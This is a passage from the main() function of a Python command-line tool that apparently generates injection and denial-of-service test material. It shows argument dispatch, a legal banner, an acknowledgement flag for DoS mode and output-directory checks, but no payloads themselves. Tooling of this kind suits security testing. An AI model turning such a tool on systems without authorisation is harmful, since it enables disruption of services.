    dos_parser.add_argument('--log-file', help='Log file path')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Setup logging
    logger = setup_logging(args.verbose, args.log_file)

    # Print legal banner
    dos_mode = args.command == 'dos'
    if not print_legal_banner(logger, dos_mode and not args.i_understand):
        if dos_mode and not args.i_understand:
            return 1

    # Set random seed if provided
    if hasattr(args, 'seed') and args.seed is not None:
        random.seed(args.seed)

    # Check output safety
    if not check_output_safety(args.output, args.force, logger):
        return 1

    # Create output directory
    os.makedirs(args.output, exist_ok=True)

    # Parse list arguments
    if hasattr(args, 'mutations'):
        args.mutations = [m.strip() for m in args.mutations.split(',')]
    if hasattr(args, 'dos_types'):
        args.dos_types = [t.strip() for t in args.dos_types.split(',')]

    # Execute command
    if args.command == 'inject':
        return cmd_inject(args, logger)
    elif args.command == 'dos':
        return cmd_dos(args, logger)

    return 0

if __name__ == "__main__":
    sys.exit(main())
